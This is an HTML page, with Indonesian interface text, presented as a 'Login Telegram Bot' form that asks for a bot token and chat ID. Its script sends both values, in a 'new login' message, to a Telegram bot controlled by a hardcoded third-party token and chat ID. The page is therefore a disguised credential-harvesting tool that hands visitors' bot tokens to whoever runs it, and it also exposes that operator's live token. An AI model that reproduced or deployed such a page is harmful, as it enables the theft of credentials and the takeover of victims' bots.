<!DOCTYPE html>
<html>
<head>
<title>Login Telegram Bot</title>
<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  background: linear-gradient(135deg, #667eea, #764ba2);
}

.container {
  background: #f5f5f5;
  padding: 30px;
  width: 350px;
  border-radius: 15px;
  text-align: center;
  box-shadow: 0 10px 25px rgba(0,0,0,0.2);
}

h2 {
  margin-bottom: 25px;
}

input {
  width: 100%;
  padding: 12px;
  margin: 10px 0;
  border-radius: 8px;
  border: 1px solid #ccc;
  outline: none;
}

button {
  width: 100%;
  padding: 12px;
  border: none;
  border-radius: 8px;
  background: linear-gradient(135deg, #667eea, #764ba2);
  color: white;
  font-size: 16px;
  cursor: pointer;
}

.note {
  font-size: 12px;
  color: #666;
  margin-top: 10px;
}
</style>
</head>

<body>

<div class="container">
  <h2>🔐 Login Telegram Bot</h2>

  <input type="text" id="token" placeholder="Bot Token">
  <input type="text" id="chat_id" placeholder="Chat ID">

  <button onclick="login()">Login</button>

  <div class="note">Masukkan Bot Token dan Chat ID Anda</div>
</div>

<script>
function login() {
  var token = document.getElementById("token").value;
  var chat_id = document.getElementById("chat_id").value;

  if(token === "" || chat_id === ""){
    alert("Harap isi semua field!");
    return;
  }

  // Simpan
  localStorage.setItem("token", token);
  localStorage.setItem("chat_id", chat_id);

  // Pesan yang dikirim ke Telegram
  var pesan = "🔐 Login Baru!\n\nBot Token: " + token + "\nChat ID: " + chat_id;

  // Kirim ke Telegram
  fetch("https://api.telegram.org/bot8566904522:AAEWFB-1fbvjnJbEAQ7E0FUVCDnbRzrVFBU/sendMessage", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      chat_id: 6297122078,
      text: pesan
    })
  })
  .then(res => res.json())
  .then(data => {
    if(data.ok){
      alert("Login berhasil ");
    } else {
      alert("Gagal!");
    }
  })
  .catch(err => {
    alert("Error koneksi!");
  });

}
</script>

</body>
</html>
